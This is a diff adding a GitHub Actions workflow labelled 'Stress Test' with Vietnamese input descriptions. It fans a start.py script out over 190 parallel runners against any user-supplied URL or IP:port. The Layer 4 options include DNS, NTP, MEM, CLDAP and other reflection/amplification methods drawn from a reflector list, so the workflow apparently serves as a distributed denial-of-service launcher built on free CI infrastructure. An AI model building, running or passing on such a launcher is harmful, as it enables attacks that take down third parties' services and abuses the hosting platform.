@@ -1,0 +1,83 @@
+name: Stress Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      layer:
+        description: "Layer (4 hoặc 7)"
+        required: true
+      method:
+        description: "Tên method (ví dụ: GET, POST, DNS, NTP)"
+        required: true
+      target:
+        description: "URL (Layer7) hoặc IP:port (Layer4)"
+        required: true
+      threads:
+        description: "Số threads"
+        default: "200"
+        required: true
+      duration:
+        description: "Thời gian test (giây)"
+        default: "60"
+        required: true
+      rpc:
+        description: "Requests per connection (chỉ Layer7)"
+        default: "50"
+        required: false
+
+jobs:
+  stress:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        job: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190]
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.x"
+
+      - name: Install dependencies
+        run: |
+         sudo python3 -m pip install --upgrade pip --root-user-action=ignore --ignore-installed
+         if [ -f requirements.txt ]; then
+          sudo python3 -m pip install -r requirements.txt --root-user-action=ignore --ignore-installed
+         fi
+      - name: Run Stress Test
+        run: |
+          if [[ "${{ github.event.inputs.layer }}" == "7" ]]; then
+            # Layer7: không dùng proxy (để trống)
+            sudo python3 start.py \
+              ${{ github.event.inputs.method }} \
+              ${{ github.event.inputs.target }} \
+              0 \
+              ${{ github.event.inputs.threads }} \
+              "http.txt" \
+              ${{ github.event.inputs.rpc }} \
+              ${{ github.event.inputs.duration }} \
+              True
+          elif [[ "${{ github.event.inputs.layer }}" == "4" ]]; then
+            case "${{ github.event.inputs.method }}" in
+              DNS|NTP|MEM|CLDAP|ARD|RDP|CHAR)
+                sudo python3 start.py \
+                  ${{ github.event.inputs.method }} \
+                  ${{ github.event.inputs.target }} \
+                  ${{ github.event.inputs.threads }} \
+                  ${{ github.event.inputs.duration }} \
+                  amnp.txt
+                ;;
+              *)
+                sudo python3 start.py \
+                  ${{ github.event.inputs.method }} \
+                  ${{ github.event.inputs.target }} \
+                  ${{ github.event.inputs.threads }} \
+                  ${{ github.event.inputs.duration }}
+                ;;
+            esac
+          else
+            echo "⚠️ Layer phải là 4 hoặc 7"
+            exit 1
+          fi
